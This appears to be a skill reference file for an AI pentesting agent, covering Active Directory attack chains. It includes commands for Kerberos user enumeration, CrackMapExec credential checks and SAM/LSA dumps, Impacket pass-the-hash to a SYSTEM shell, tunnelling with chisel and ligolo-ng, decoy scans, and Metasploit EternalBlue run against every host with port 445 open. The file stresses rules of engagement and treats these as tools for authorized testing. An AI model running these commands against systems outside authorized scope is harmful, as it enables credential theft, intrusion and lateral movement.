---
name: active-directory-testing
description: Internal Active Directory / Windows domain enumeration and credential-validation chain — for authorized internal pentest engagements, AD labs, and CTF-style domain environments where the target explicitly includes on-prem Windows infrastructure (not typical external web bug bounty scope). Covers the foothold-to-proof-of-impact path: service/RPC recon (Print Spooler/MS-RPRN), confirming locked-down null-session/anonymous-WMI paths, Kerberos user enumeration via KDC error responses, credential validation across protocols (CrackMapExec), and hash extraction + pass-the-hash via Impacket psexec through to a SYSTEM/Domain-Admin-equivalent shell — stopping at proof of impact rather than detailing persistence, C2, or credential-interception mechanics, which stay out of scope for this file. Use this during Phase 3/4 (Vulnerability Testing/Validation) of bughunting-workflow only when a program's scope explicitly includes internal network/AD infrastructure, or during an authorized internal pentest/red-team engagement/AD lab (HackTheBox, CRTP/CRTE-style, TryHackMe) — a materially different scope and risk profile than a public web bug bounty target. Also trigger on mentions of Kerberoasting, ASREPRoasting, CrackMapExec, Impacket, pass-the-hash, or domain admin enumeration/validation.
---

# Active Directory / Windows Domain Testing

Technique library for internal AD engagements — a fundamentally different target category from the rest of this skill set (which is external web/API bug bounty). Each dated entry below is pulled from a real writeup/lab walkthrough — extend this file (don't create a duplicate skill) when a new source covers a different AD attack primitive than what's already recorded.

## Core theory — and the line this skill sets

Active Directory compromise chains almost always follow the same shape: **get one foothold credential (any kind, even a low-privilege service account) → use it to enumerate more of the domain than an unauthenticated user could see → find a privilege-escalation or lateral-movement primitive (weak ACL, delegation misconfig, reused local-admin hash, exposed service) → repeat until you hold a Domain Admin credential or equivalent (DCSync rights) → optionally, prove domain-wide impact (DNS control, GPO abuse, credential harvesting at scale).**

**Critical scope/ethics distinction from the rest of this hunter's skill set:** in a web bug bounty engagement, "prove impact without persisting access" (see `post-access-impact`) is the standard — you demonstrate a path exists and stop. In an AD engagement authorized as a full internal pentest/red-team exercise, the *rules of engagement themselves* usually call for demonstrating persistence, lateral movement, and domain dominance as the deliverable — that's the difference between a pentest and a bug bounty report. **Before running anything below beyond initial enumeration, confirm which kind of engagement this is and what the signed scope/RoE actually authorizes:**
- Enumeration, credential validation, and a single controlled proof of privilege escalation → almost always fine under either a pentest or a bug-bounty-style internal-scope program.
- **Persistence mechanisms** (hidden domain admin accounts, service hijacking, Golden/Silver Tickets valid for years, planted C2 backdoors) → only run these if the RoE explicitly calls for demonstrating persistence, and always document and remove them (or hand the client a full list to remove) before engagement close-out. Never leave a "sliver$" hidden domain admin account or a 10-year Golden Ticket active in a client's real production AD past the engagement window.
- **DNS record injection, Responder-based credential harvesting from live user traffic, C2 deployment** → these actively intercept/redirect real user traffic and can affect users outside the test's intended blast radius; confirm explicitly the RoE covers this before running it, distinct from confirming the vuln class itself is in scope.

## Putting it together — how the recorded techniques below chain into one engagement

The four entries below aren't independent tips, they're stages of the same engagement that typically fire in this order. None of them is optional just because it's "already covered elsewhere" — each stage's output is the next stage's input:

1. **Get a foothold and start scanning** — entry #1's Phase 1-2 (RPC/Print Spooler recon, confirming null-session/anonymous paths are actually locked down) is the opening move on a target you can already reach directly. If the real target is a *second*, internal-only subnet behind a host you've already compromised, you need entry #3's pivoting layers (direct nmap on the pivot → SOCKS/proxychains → ligolo-ng/Metasploit routing) before any of the rest of this list can even reach its targets.
2. **Watch for the same-subnet `-Pn`/ARP trap while scanning the first layer in** — entry #2 is specifically a failure mode of step 1/3's own nmap calls: if a host independently confirmed alive comes back empty through `-Pn`, that's the ARP-resolution quirk, not a dead host — fix it with `--disable-arp-ping` before concluding anything about what's actually running there.
3. **Once you have usable scan data, feed it into Metasploit's database instead of re-typing targets by hand** — entry #4's `db_nmap`/`db_import` + `workspace` workflow is where steps 1-3's scan output (whether gathered directly, through a pivot, or after fixing an ARP false-negative) actually gets used: import it once, then query `services -p <port> -R` to auto-populate `RHOSTS` straight into whatever module the discovered service suggests (e.g. SMB 445 → `ms17_010_eternalblue`).
4. **Run entry #1's full enumeration → credential-validation → pass-the-hash chain** against whatever the database now shows — Kerberos user enum, CrackMapExec validation across protocols, and Impacket pass-the-hash all assume you already know which hosts/services exist, which is exactly what steps 1-3 just built.
5. **Once any shell/credential is obtained on an AD-joined host (or any host at all), hand off to `post-access-impact`** for the generic post-exploitation checklist (SUID/sudo enumeration, cron jobs, credential harvesting) — that skill now also covers the `sudo nmap --script` NSE-Lua privesc variant and a writable-service-config + sudo-restart user-hijack technique, both discovered via this same lineage of AD/internal-engagement writeups. If the initial foothold itself came through a web-facing LFI rather than a network-level AD technique, `path-traversal-testing`'s log-poisoning-to-RCE entry is the step that precedes this handoff.

Treat this skill (AD/internal-network specifics) and `post-access-impact` (generic post-shell checklist) as two halves of the same lifecycle — this file owns "how do I reach and enumerate the internal network," the other owns "what do I do once I'm executing code somewhere in it."

## Recorded techniques

### 1. Zero-access-to-proof-of-impact chain (Print Spooler recon → Kerberos user enum → credential validation → pass-the-hash)
Source: [Breaking a Hardened Active Directory: From Zero Access to Domain Dominance](https://freedium-mirror.cfd/https://medium.com/codetodeploy/breaking-a-hardened-active-directory-from-zero-access-to-domain-dominance-6e8e3e523e83)

**Where:** an internal Windows domain environment (lab or authorized internal engagement) with null-session/anonymous access already locked down — this chain is specifically the "what still works when the easy stuff is blocked" path.

**Phase 1 — Recon (find the foothold):**
- Port-scan for exposed RPC interfaces; the Print Spooler service exposing `MS-RPRN` (Print System Remote Protocol) on an otherwise-hardened host was the entry-point signal here — flag any host with the spooler service reachable remotely as a priority target even when other enumeration avenues are locked down.

**Phase 2 — Confirm the easy paths are actually blocked (don't skip this, it's cheap and rules out false starts):**
```bash
smbmap -H <target-ip> -u '' -p ''                          # null-session SMB — expect denial on a hardened target
wmic -U '' //<target-ip> "SELECT Name FROM Win32_UserAccount"  # anonymous WMI — expect denial
```
A C2 payload (Empire/Starkiller with an AMSI bypass) getting caught by Defender is also worth noting explicitly in a report as evidence of working EDR, not just a failed step — "here's what your defenses correctly blocked" is useful signal for the client alongside "here's what got through."

**Phase 3 — Kerberos user enumeration (works even when SMB/WMI are locked down, since it doesn't require any session):**
```bash
nmap -p 88 --script krb5-enum-users \
  --script-args krb5-enum-users.realm='LAB.DOMAIN',userdb=/usr/share/wordlists/common_users.txt \
  <target-ip>
```
This abuses the fact that the KDC's error response differs between "no such principal" and "principal exists, wrong preauth" — a classic Kerberos-level username-enumeration oracle, conceptually the same class of bug as this hunter's `session-auth-testing` entry #16 (login-form username enumeration), just at the domain-authentication-protocol layer instead of an HTTP form. Confirms which discovered accounts (here, an admin service account with an SPN) actually exist before spending effort on credential attacks against them.

**Phase 4 — Validate and confirm a working credential across every relevant protocol:**
```bash
smbclient -L <target-ip> -N
crackmapexec smb <target-ip> -u administrator -p '<password>'
crackmapexec winrm <target-ip> -u administrator -p '<password>'
```
Checking the same credential against multiple protocols (SMB, WinRM) in one pass with CrackMapExec is standard practice — a credential valid on SMB but not WinRM (or vice versa) still tells you which lateral-movement/execution methods are actually available.

**Phase 5 — Hash extraction + pass-the-hash (proof of impact — stop here for a standard engagement):**
```bash
crackmapexec smb <target-ip> -u administrator -p '<password>' --sam --lsa   # dump local SAM + LSA secrets
psexec.py -hashes '<NT_HASH>' LAB.DOMAIN/Administrator@<target-ip>          # Impacket pass-the-hash → SYSTEM shell
```
Pass-the-hash means the plaintext password is never needed again once an NT hash is captured — treat any captured NT hash as equivalent to the password itself for every subsequent step. Obtaining a SYSTEM shell via pass-the-hash on the Domain Controller (or any domain-joined host) is already full proof of domain-admin-equivalent impact for a report — screenshot `whoami`/`hostname` and stop, per `post-access-impact`'s "prove the path, don't walk it further than needed" principle.

**Beyond this point — out of scope for this skill file.** The source writeup continues into C2 deployment, persistence (hidden accounts, service hijacking, Golden Ticket forging), and live-traffic credential interception (DNS record injection + Responder). Those are legitimate techniques *within a full red-team engagement whose signed RoE explicitly calls for demonstrating persistence and lateral movement as the deliverable* — but they're also directly reusable as a real intrusion's playbook, and un-reversed persistence artifacts (a planted backdoor account, a hijacked service, a multi-year forged ticket) left behind after a test is exactly the kind of harm authorization is supposed to prevent. If an engagement's RoE genuinely requires demonstrating that phase, work from the client-approved toolchain/runbook for that engagement directly rather than from a saved technique file, and track every persistence artifact created so it can be fully removed at engagement close-out before handing back the environment.

### 2. `-Pn` doesn't fully suppress local host discovery — ARP still runs underneath it
Source: [When Nmap Says Nothing: A Small Change That Made Internal Service Discovery Possible During an [AD Assessment]](https://freedium-mirror.cfd/https://janmuhammadzaidi.medium.com/when-nmap-says-nothing-a-small-change-that-made-internal-service-discovery-possible-during-an-15094f77e7ce)

**Where:** any internal/on-LAN engagement scanning hosts on the same Ethernet broadcast domain as the scanning box — this is specifically a same-subnet quirk, not something that shows up scanning over a routed/external connection.

**Root cause:** `-Pn` is documented as "skip host discovery, treat every target as online," but on a local Ethernet segment Nmap still prefers ARP resolution to actually reach a target at the link layer — ARP isn't the *host-discovery ping* `-Pn` is meant to suppress, it's the underlying address-resolution Nmap needs just to route packets to a same-subnet host at all. A host that's genuinely up can still produce no results if whatever's intercepting/filtering ARP traffic in the environment (segmentation, endpoint security, a virtualization layer silently dropping ARP replies) interferes with that resolution step — and because `-Pn` *looks* like it should have bypassed all discovery logic, this silent ARP dependency is easy to miss entirely, reading as "the host must be down" when it's actually "ARP resolution for this host is failing for an unrelated reason."

**Symptom:** `nmap -sV -Pn <ip>` against a target already confirmed online elsewhere (ping, another tool, known-good AD host) comes back empty/no-response, with no indication anything related to ARP was even involved.

**Fix:**
```bash
nmap -sV -Pn --disable-arp-ping --packet-trace -D RND:5 <ip-address>
```
- `--disable-arp-ping` — forces Nmap to skip the ARP-based resolution step entirely and fall back to its other discovery/connection mechanisms, actually honoring what `-Pn` was expected to do on a local segment.
- `--packet-trace` — the diagnostic flag that actually surfaces this: shows every packet Nmap sends/receives, which is how the ARP requests going out (and not coming back) become visible in the first place rather than a silent, unexplained empty result. Reach for this any time `-Pn` output looks wrong and you need to see what Nmap is actually doing under the hood.
- `-D RND:5` — generates 5 random decoy source addresses alongside the real scan traffic; not required to fix the ARP issue itself, but worth keeping in the same command on an internal engagement where ARP/network traffic is being actively monitored (noted in the source as a real factor on hardened internal networks), since it adds ambiguity to which source actually originated the scan in captured logs.

**Generalize note:** any time a target is independently confirmed alive but a `-Pn` scan still comes back with nothing, reach for `--packet-trace` before assuming the host is actually unreachable or filtered — it's the fastest way to see whether an ARP-resolution failure (same-subnet only) or something else entirely (a genuine filter/firewall) is the real cause, and `--disable-arp-ping` is the specific fix for the former. This is a LAN/internal-engagement-specific nmap quirk — cross-reference `recon-scanning-toolkit`'s broader nmap flag/scan-type reference for everything else; this entry lives here rather than there since it only surfaces in the on-prem/AD-engagement context this skill covers.

### 3. Pivoting internal-network scanning through a compromised host — three-layer escalation (direct, SOCKS/proxychains, TUN routing)
Source: [Nmap Through Pivots: Scanning Internal Networks](https://freedium-mirror.cfd/https://levelup.gitconnected.com/nmap-through-pivots-scanning-internal-networks-c3e6bc804e16)

**Where:** once a foothold (SSH access, reverse shell, any shell) is obtained on a host that bridges the attacker's machine to an otherwise-unreachable internal subnet — a direct continuation of Phase 5's "stop at proof of impact" point in entry #1 above, for engagements whose RoE *does* call for demonstrating lateral reach into segmented internal networks.

**Root cause/premise:** a compromised machine is frequently dual-homed — reachable from the attacker's position on one interface, and itself able to reach a second, internal-only subnet the attacker has no direct route to. Scanning that second subnet requires routing traffic *through* the compromised host rather than directly from the attacker's own machine, and each of the three techniques below is a different way to achieve that routing, in increasing order of capability and setup cost.

**Layer 1 — run Nmap natively on the pivot itself (try this first, cheapest, zero limitations):**
```bash
nmap --version                      # confirm nmap is present on the pivot
ip a; ip route; arp -a              # map the pivot's own interfaces/routes/ARP cache
for i in $(seq 1 254); do ping -c1 -W1 10.x.x.$i 2>/dev/null | grep "64 bytes" && echo "UP $i"; done   # cheap internal ping sweep with no extra tooling
nmap -sT -Pn -sV -p <ports> <internal-target>
```
No proxy involved at all — every scan type, NSE script, and version-detection feature works exactly as it would locally. The only limitation is whether Nmap (and a recent-enough version for the NSE categories needed) is actually installed on the pivot host; if not, fall back to Layer 2.

**Layer 2 — SOCKS proxy + proxychains (when Nmap isn't available/usable on the pivot itself):**
```bash
# Tunnel setup — SSH is simplest if the pivot has it
ssh -D 1080 -N -f user@pivot_ip

# Chisel when SSH isn't available/usable
./chisel server -p 8080 --reverse        # on attacker box
./chisel client kali_ip:8080 R:socks     # on pivot

# /etc/proxychains4.conf
socks5 127.0.0.1 1080

# Verify the tunnel actually works before trusting any nmap output through it
proxychains curl http://internal_target

proxychains nmap -sT -Pn -n --max-parallelism 1 --scan-delay 500ms --max-retries 3 -p 21,22,80,443,3306 <internal-target>
```
**Hard constraints, not tuning knobs:** `-sT` (full TCP connect) is mandatory — SYN scans (`-sS`) use raw sockets that bypass the SOCKS proxy entirely and will not route through the tunnel at all; UDP scanning, ICMP, and OS detection (`-O`) are all similarly incompatible with proxying through proxychains. Always add `-n` to stop Nmap's own DNS queries leaking outside the proxy.

**Known false-positive trap:** proxychains+nmap frequently reports confirmed-open ports as `filtered` — this is a latency/timing artifact of the proxy chain, not real filtering. Don't trust a `filtered` result through Layer 2 at face value; tune `--max-parallelism 1 --scan-delay 500ms --max-retries 3` down to single-threaded/slow-and-patient before concluding a port is actually blocked, and cross-check against Layer 1 ground truth when available.

**Layer 3 — full TUN routing with ligolo-ng (when Layer 2's SOCKS constraints are blocking scan types you actually need):**
```bash
sudo ip tuntap add user $USER mode tun ligolo         # create the virtual interface on the attacker box
sudo ./proxy -selfcert -laddr 0.0.0.0:11601            # start the proxy listener (Kali side)
./agent -connect kali_ip:11601 -ignore-cert             # connect from the pivot host
sudo ip route add 10.30.1.0/24 dev ligolo               # route the internal subnet through the tunnel interface

nmap -sS -sV <internal-target>                           # now runs natively — SYN scan, version detection, everything
```
Creates an actual virtual network interface rather than a SOCKS proxy, so traffic routes through it exactly like a normal network path — every Nmap scan type and feature works with zero workarounds, at the cost of needing root on the attacker box and transferring an architecture-matched agent binary to the pivot. (Metasploit's `route add <subnet> <mask> <session_id>` + `auxiliary/server/socks_proxy` module is a built-in alternative to standalone ligolo-ng/chisel when already working inside a Meterpreter session.)

**Decision hierarchy:** try Layer 1 first and treat its results as ground truth when available; escalate to Layer 2 only when Nmap isn't usable directly on the pivot, and don't trust a Layer 2 `filtered` verdict without tuning/cross-checking first; escalate to Layer 3 only when Layer 2's `-sT`-only/no-UDP/no-OS-detection constraints are actually blocking a scan type the engagement needs.

**Generalize note:** this is the internal-lateral-movement counterpart to `waf-origin-ip-discovery-testing`'s external WAF-bypass-via-direct-origin-connection pattern — both are "route around whatever's standing between you and the real target" techniques, just at opposite ends of an engagement (pre-auth external vs. post-foothold internal). Cross-reference `recon-scanning-toolkit`'s nmap flag/scan-type reference for what each scan type actually does once you're routing through any of these three layers.

### 4. Metasploit database-integrated workflow — db_nmap/db_import, workspaces, and RHOSTS auto-population
Source: [Nmap + Metasploit: The Handshake Nobody Explains](https://freedium-mirror.cfd/https://levelup.gitconnected.com/nmap-metasploit-the-handshake-nobody-explains-163f4136ab2e)

**Where:** any internal engagement with enough hosts/services that manually copy-pasting IPs between an nmap scan and individual Metasploit module `RHOSTS` settings becomes error-prone or slow — the workflow scales recon-to-exploitation across many hosts in one data pipeline instead of one target at a time.

**Setup (one-time per engagement):**
```bash
sudo service postgresql start
sudo service postgresql status   # confirm listening on 5432
sudo msfdb init                  # one-time database init
msfconsole
msf6 > db_status                 # confirm "postgresql connected"
msf6 > workspace -a engagement_name   # isolate this engagement's data from others
```

**Two ways to get scan data into the database:**
1. **`db_nmap`** — run nmap from inside msfconsole, results stream straight into the DB, no intermediate XML:
```
msf6 > db_nmap -sS -sV -p 21,22,80,139,445 <target>
```
Supports the same flags as standalone nmap (`-sS`, `-sV`, `-p`, `--script`, `-T4`).

2. **`db_import`** (preferred when nmap needs to run outside Metasploit — e.g. a long background scan, or scanning from a different host than the one running msfconsole): scan separately with `-oA` to generate all output formats, then import the XML:
```bash
nmap -sS -sV -p- -oA fullscan <target>
```
```
msf6 > db_import /path/to/fullscan.xml
```
Multiple imports merge into the same active workspace, so results from several scan passes (or several hosts scanned separately) accumulate in one place.

**Querying the accumulated data:**
```
msf6 > hosts              # address, MAC, hostname, OS detection per host
msf6 > services           # port, protocol, service name/version per service
msf6 > services -p 22     # filter to just one port/service across all hosts
msf6 > vulns              # NSE vuln-script findings (only populated if the nmap scan used --script vuln)
```

**The actual time-saver — `-R` auto-populates `RHOSTS` from a query, skipping manual target entry:**
```
msf6 > services -p 445 -R
# => RHOSTS => <comma-separated list of every host with port 445 open>
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > run
```
Same pattern for any protocol-scoped module — e.g. `services -p 22 -R` then `use auxiliary/scanner/ssh/ssh_login` to run a credential check against every SSH host the scan found, in one `run`, instead of looping manually.

**Evidence/reporting:**
```
msf6 > db_export -f xml /path/to/export.xml
```
Exports the full workspace — hosts, services, vulns, credentials, session data — for inclusion in the engagement report.

**Generalize note:** the value here isn't any individual command but the pipeline shape — scan once, let every subsequent module pull its targets from the shared database instead of being re-told the IP list by hand, and keep engagements separated via `workspace -a`/`workspace -d`/`workspace <name>` so results from different clients/targets never cross-contaminate. Same internal-engagement scope caveat as the rest of this skill — `ms17_010_eternalblue` and similar SMB/Windows-domain exploit modules only apply when scope explicitly includes internal Windows infrastructure, not an external web bug bounty target.

<!-- Add new recorded techniques below this line as new AD/internal-Windows-domain writeups are processed. -->